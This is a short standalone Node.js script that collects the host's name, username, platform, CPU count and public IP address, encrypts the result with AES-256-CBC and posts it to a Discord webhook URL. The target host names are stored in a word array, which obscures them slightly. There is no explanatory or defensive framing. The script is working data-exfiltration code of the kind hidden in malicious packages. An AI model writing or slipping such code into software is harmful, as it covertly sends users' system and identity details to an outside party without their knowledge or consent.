const os = require('os');
const https = require('https');
const { createCipheriv, randomBytes } = require('crypto');

const words = ['discord.com', 'webhooks', 'api.ipify.org', 'aes-256-cbc'];
const profile = {
  'host': os.hostname(),
  username: os.userInfo().username,
  platform: os.platform(),
  cpuCount: os.cpus().length,
  ip: null,
};

https.get(`https://${words[2]}?format=json`, (response) => {
  let data = '';
  response.on('data', (chunk) => { data += chunk; });
  response.on('end', () => {
    profile.ip = JSON.parse(data).ip;
    const cipher = createCipheriv(words[3], Buffer.alloc(32), randomBytes(16));
    const encrypted = Buffer.concat([
      cipher.update(JSON.stringify(profile)),
      cipher.final(),
    ]).toString('hex');
    const body = JSON.stringify({ content: encrypted });
    const request = https.request({
      hostname: words[0],
      port: 443,
      path: `/api/${words[1]}/123/token`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(body),
      },
    });
    request.end(body);
  });
});
